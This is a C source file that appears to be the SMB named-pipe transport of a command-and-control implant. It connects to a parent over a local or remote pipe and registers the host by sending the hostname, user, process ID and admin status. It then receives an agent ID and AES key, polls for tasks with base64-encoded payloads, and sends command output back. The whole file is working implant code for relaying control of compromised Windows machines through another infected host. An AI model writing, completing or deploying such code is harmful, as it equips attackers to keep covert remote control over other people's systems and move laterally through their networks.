#include "transport_smb.h"
#include "transport.h"
#include "config.h"
#include "b64.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#define SECURITY_WIN32
#include <secext.h>

// Global pipe handle — opened once during register, kept for beacon/result.
static HANDLE g_smb_pipe = INVALID_HANDLE_VALUE;

/* Escape a string before embedding it in a JSON string value.  SMB messages
 * can contain Windows paths (backslashes), command output, quotes and
 * newlines; emitting those bytes verbatim makes the parent reject the frame. */
static char* smb_json_escape(const char *s) {
    if (!s) return _strdup("");

    size_t need = 1;
    for (const unsigned char *p = (const unsigned char*)s; *p; p++) {
        switch (*p) {
        case '"': case '\\': case '\n': case '\r': case '\t':
        case '\b': case '\f':
            need += 2;
            break;
        default:
            need += (*p < 0x20) ? 6 : 1;
            break;
        }
    }

    char *out = (char*)malloc(need);
    if (!out) return NULL;
    size_t n = 0;
    for (const unsigned char *p = (const unsigned char*)s; *p; p++) {
        switch (*p) {
        case '"':  out[n++] = '\\'; out[n++] = '"';  break;
        case '\\': out[n++] = '\\'; out[n++] = '\\'; break;
        case '\n': out[n++] = '\\'; out[n++] = 'n';  break;
        case '\r': out[n++] = '\\'; out[n++] = 'r';  break;
        case '\t': out[n++] = '\\'; out[n++] = 't';  break;
        case '\b': out[n++] = '\\'; out[n++] = 'b';  break;
        case '\f': out[n++] = '\\'; out[n++] = 'f';  break;
        default:
            if (*p < 0x20) {
                static const char hex[] = "0123456789abcdef";
                out[n++] = '\\'; out[n++] = 'u';
                out[n++] = '0'; out[n++] = '0';
                out[n++] = hex[*p >> 4]; out[n++] = hex[*p & 0x0f];
            } else {
                out[n++] = (char)*p;
            }
            break;
        }
    }
    out[n] = '\0';
    return out;
}

// ── Framing helpers ───────────────────────────────────────────────────────────

// Write a 4-byte LE length prefix followed by data.
static int pipe_write_msg(HANDLE h, const uint8_t *data, size_t len) {
    uint8_t hdr[4];
    hdr[0] = (uint8_t)(len & 0xff);
    hdr[1] = (uint8_t)((len >> 8) & 0xff);
    hdr[2] = (uint8_t)((len >> 16) & 0xff);
    hdr[3] = (uint8_t)((len >> 24) & 0xff);
    DWORD w = 0;
    if (!WriteFile(h, hdr, 4, &w, NULL) || w != 4) return 0;
    if (len == 0) return 1;
    if (!WriteFile(h, data, (DWORD)len, &w, NULL) || w != (DWORD)len) return 0;
    return 1;
}

// Read a 4-byte LE length prefix then that many bytes. Caller must free().
static uint8_t* pipe_read_msg(HANDLE h, size_t *out_len) {
    *out_len = 0;
    uint8_t hdr[4]; DWORD r = 0;
    if (!ReadFile(h, hdr, 4, &r, NULL) || r != 4) return NULL;
    size_t len = (size_t)hdr[0] | ((size_t)hdr[1]<<8) |
                 ((size_t)hdr[2]<<16) | ((size_t)hdr[3]<<24);
    if (len == 0 || len > 16*1024*1024) return NULL;
    uint8_t *buf = (uint8_t*)malloc(len + 1);
    if (!buf) return NULL;
    size_t got = 0;
    while (got < len) {
        DWORD rr = 0;
        if (!ReadFile(h, buf + got, (DWORD)(len - got), &rr, NULL) || rr == 0) {
            free(buf); return NULL;
        }
        got += rr;
    }
    buf[len] = '\0';
    *out_len = len;
    return buf;
}

// ── Pipe open helper ──────────────────────────────────────────────────────────

static HANDLE open_pipe(void) {
    /* Normalize bare pipe name → \\.\pipe\<name> (mirrors norm_pipe_name in pipe_server.c) */
    char norm[256] = {0};
    if (strncmp(AGENT_SMB_PIPE, "\\\\.\\pipe\\", 9) == 0 ||
        strncmp(AGENT_SMB_PIPE, "\\\\", 2) == 0) {
        strncpy(norm, AGENT_SMB_PIPE, sizeof(norm) - 1);
    } else {
        snprintf(norm, sizeof(norm), "\\\\.\\pipe\\%s", AGENT_SMB_PIPE);
    }
    wchar_t wpath[256] = {0};
    MultiByteToWideChar(CP_UTF8, 0, norm, -1, wpath, 256);

    // Retry for up to 30 seconds. WaitNamedPipeW works for local pipes but
    // not remote UNC paths, so we also loop on CreateFile for reliability.
    for (int attempt = 0; attempt < 30; attempt++) {
        WaitNamedPipeW(wpath, 5000);
        HANDLE h = CreateFileW(wpath,
            GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) return h;
        if (attempt < 29) Sleep(1000);
    }
    return INVALID_HANDLE_VALUE;
}

// ── Transport operations ──────────────────────────────────────────────────────

int transport_smb_register(void) {
    if (g_smb_pipe != INVALID_HANDLE_VALUE) {
        CloseHandle(g_smb_pipe);
        g_smb_pipe = INVALID_HANDLE_VALUE;
    }

    g_smb_pipe = open_pipe();
    if (g_smb_pipe == INVALID_HANDLE_VALUE) return 0;

    char hostname[128]="UNKNOWN", username[256]="UNKNOWN";
    DWORD hsz=sizeof(hostname);
    GetComputerNameA(hostname, &hsz);
    for (DWORD i = 0; i < hsz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
    ULONG usz=sizeof(username);
    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
        GetUserNameA(username, (DWORD*)&usz);
    char *hostname_j = smb_json_escape(hostname);
    char *username_j = smb_json_escape(username);
    if (!hostname_j || !username_j) {
        free(hostname_j); free(username_j);
        return 0;
    }

    /* Inline elevation check (TOKEN_ELEVATION). */
    int elevated = 0;
    {   HANDLE tok = NULL;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
            DWORD elev = 0, sz = sizeof(DWORD);
            if (GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &sz))
                elevated = (int)elev;
            CloseHandle(tok);
        }
    }

    char body[2048];
    snprintf(body, sizeof(body),
        "{\"type\":\"REGISTER\",\"hostname\":\"%s\",\"username\":\"%s\","
        "\"os\":\"windows/amd64\",\"pid\":%lu,\"transport\":\"smb\","
        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"is_admin\":%s,\"language\":\"c\"}",
        hostname_j, username_j, (unsigned long)GetCurrentProcessId(),
        AGENT_SLEEP_SEC, AGENT_JITTER_PCT, elevated ? "true" : "false");
    free(hostname_j); free(username_j);

    if (!pipe_write_msg(g_smb_pipe, (const uint8_t*)body, strlen(body)))
        return 0;

    size_t resp_len = 0;
    uint8_t *resp = pipe_read_msg(g_smb_pipe, &resp_len);
    if (!resp) return 0;

    char agent_id[64]={0}, aes_key_b64[128]={0};
    agent_json_str((char*)resp, "agent_id", agent_id, sizeof(agent_id));
    agent_json_str((char*)resp, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
    free(resp);

    if (!agent_id[0] || !aes_key_b64[0]) return 0;

    size_t key_len = 0;
    uint8_t *key = b64_decode(aes_key_b64, &key_len);
    if (!key || key_len < 32) { free(key); return 0; }

    strncpy(g_agent.agent_id, agent_id, sizeof(g_agent.agent_id) - 1);
    memcpy(g_agent.aes_key, key, 32);
    g_agent.has_key = 1;
    free(key);
    return 1;
}

AgentTask* transport_smb_beacon(int *count) {
    *count = 0;
    if (g_smb_pipe == INVALID_HANDLE_VALUE) return NULL;

    char body[256];
    snprintf(body, sizeof(body), "{\"type\":\"BEACON\",\"agent_id\":\"%s\"}", g_agent.agent_id);

    if (!pipe_write_msg(g_smb_pipe, (const uint8_t*)body, strlen(body))) return NULL;

    size_t resp_len = 0;
    uint8_t *resp = pipe_read_msg(g_smb_pipe, &resp_len);
    if (!resp || resp_len == 0) { free(resp); return NULL; }

    // SMB beacon response is a JSON array [...], not {"tasks":[...]}
    // Find the start of the array
    const char *p = (const char*)resp;
    while (*p && *p != '[') p++;
    if (!*p || p[1] == ']') { free(resp); return NULL; }
    p++; // skip '['

    int cap = 16;
    AgentTask *tasks = (AgentTask*)calloc(cap, sizeof(AgentTask));
    if (!tasks) { free(resp); return NULL; }

    const char *obj_end;
    while ((p = agent_json_next_obj(p, &obj_end)) != NULL) {
        size_t obj_len = obj_end - p + 1;
        char *obj = (char*)malloc(obj_len + 1);
        if (!obj) break;
        memcpy(obj, p, obj_len); obj[obj_len] = '\0';

        if (*count >= cap) {
            cap *= 2;
            AgentTask *nt = (AgentTask*)realloc(tasks, cap * sizeof(AgentTask));
            if (!nt) { free(obj); break; }
            tasks = nt;
        }
        AgentTask *t = &tasks[*count];
        t->id = agent_json_int(obj, "id");
        agent_json_str(obj, "type", t->type, sizeof(t->type));
        t->args = agent_json_str_alloc(obj, "args");
        t->payload = NULL; t->payload_len = 0;
        char *pl_b64 = agent_json_str_alloc(obj, "payload");
        if (pl_b64 && pl_b64[0]) t->payload = b64_decode(pl_b64, &t->payload_len);
        free(pl_b64); free(obj);
        (*count)++;
        p = obj_end + 1;
        if (*p == ']') break;
    }
    free(resp);
    return tasks;
}

void transport_smb_send_result(long long task_id, const char *output,
                                const char *error, int is_admin) {
    if (g_smb_pipe == INVALID_HANDLE_VALUE) return;

    char *output_j = smb_json_escape(output ? output : "");
    char *error_j  = smb_json_escape(error ? error : "");
    if (!output_j || !error_j) {
        free(output_j); free(error_j);
        return;
    }

    size_t body_sz = strlen(output_j) + strlen(error_j) + 256;
    char *body = (char*)malloc(body_sz);
    if (!body) {
        free(output_j); free(error_j);
        return;
    }
    snprintf(body, body_sz,
        "{\"type\":\"RESULT\",\"agent_id\":\"%s\",\"task_id\":%lld,"
        "\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
        g_agent.agent_id, task_id,
        output_j, error_j,
        is_admin?"true":"false");
    free(output_j); free(error_j);

    pipe_write_msg(g_smb_pipe, (const uint8_t*)body, strlen(body));
    free(body);

    // Drain the ACK
    size_t rl = 0;
    uint8_t *r = pipe_read_msg(g_smb_pipe, &rl);
    free(r);
}
